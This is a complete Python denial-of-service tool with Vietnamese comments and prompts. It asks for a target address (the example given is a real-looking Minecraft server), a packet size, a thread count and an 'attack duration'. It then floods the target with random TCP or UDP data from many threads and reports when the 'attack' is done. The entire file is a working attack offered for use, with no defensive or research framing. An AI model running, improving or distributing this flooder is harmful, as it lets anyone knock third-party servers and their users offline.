import socket
import threading
import time
import random
import os

# Hàm tạo gói tin ngẫu nhiên
def generate_random_packet(size):
    return os.urandom(size)

# Hàm gửi gói tin TCP
def send_packet_tcp(server_ip, server_port, packet_size, thread_id, stop_event):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)  # Timeout để tránh treo kết nối
            s.connect((server_ip, server_port))
            while not stop_event.is_set():
                packet = generate_random_packet(packet_size)
                s.sendall(packet)
            print(f"[Thread-{thread_id}] Đã hoàn thành việc gửi gói tin qua TCP.")
    except Exception as e:
        print(f"[Thread-{thread_id}] Gặp lỗi: {e}")

# Hàm gửi gói tin UDP
def send_packet_udp(server_ip, server_port, packet_size, thread_id, stop_event):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            while not stop_event.is_set():
                packet = generate_random_packet(packet_size)
                s.sendto(packet, (server_ip, server_port))
            print(f"[Thread-{thread_id}] Đã hoàn thành việc gửi gói tin qua UDP.")
    except Exception as e:
        print(f"[Thread-{thread_id}] Gặp lỗi: {e}")

# Hàm hủy luồng sau timeout
def stop_thread_after_timeout(stop_event, timeout):
    time.sleep(timeout)
    stop_event.set()
    print(f"[Thread Timeout] Luồng đã được yêu cầu dừng sau {timeout} giây.")

# Nhập IP và port từ người dùng
try:
    server_address = input("Nhập địa chỉ server (ví dụ: dragonsmp.myftp.org:25565): ")
    server_ip, server_port = server_address.split(":")
    server_port = int(server_port)  # Chuyển cổng sang số nguyên
except ValueError:
    print("Địa chỉ server không hợp lệ. Vui lòng nhập lại!")
    exit()

# Nhập kích thước gói tin
try:
    packet_size = int(input("Nhập kích thước gói tin (KB): ")) * 1024
except ValueError:
    print("Kích thước gói tin không hợp lệ, sử dụng mặc định 1MB.")
    packet_size = 1024 * 1024

# Nhập số luồng muốn sử dụng
try:
    thread_count = int(input("Nhập số lượng luồng: "))
    if thread_count <= 0:
        print("Số lượng luồng phải lớn hơn 0!")
        exit()
except ValueError:
    print("Số lượng luồng không hợp lệ. Vui lòng nhập lại!")
    exit()

# Nhập thời gian tấn công
try:
    attack_duration = int(input("Nhập thời gian tấn công (giây): "))
    if attack_duration <= 0:
        print("Thời gian tấn công phải lớn hơn 0!")
        exit()
except ValueError:
    print("Thời gian tấn công không hợp lệ. Vui lòng nhập lại!")
    exit()

# Chọn giao thức TCP hoặc UDP
protocol = input("Chọn giao thức (TCP/UDP): ").strip().lower()
if protocol not in ["tcp", "udp"]:
    print("Giao thức không hợp lệ, mặc định sử dụng TCP.")
    protocol = "tcp"

# Tạo và khởi tạo các luồng
threads = []
stop_events = []

for i in range(thread_count):
    stop_event = threading.Event()
    stop_events.append(stop_event)
    
    if protocol == "tcp":
        thread = threading.Thread(target=send_packet_tcp, args=(server_ip, server_port, packet_size, i + 1, stop_event))
    else:  # UDP
        thread = threading.Thread(target=send_packet_udp, args=(server_ip, server_port, packet_size, i + 1, stop_event))
    
    threads.append(thread)
    thread.start()

    # Hủy luồng sau thời gian tấn công
    timer = threading.Thread(target=stop_thread_after_timeout, args=(stop_event, attack_duration))
    timer.start()

# Đợi tất cả các luồng hoàn thành
for thread in threads:
    thread.join()

print("[Hoàn tất] Đã hoàn tất việc tấn công server.")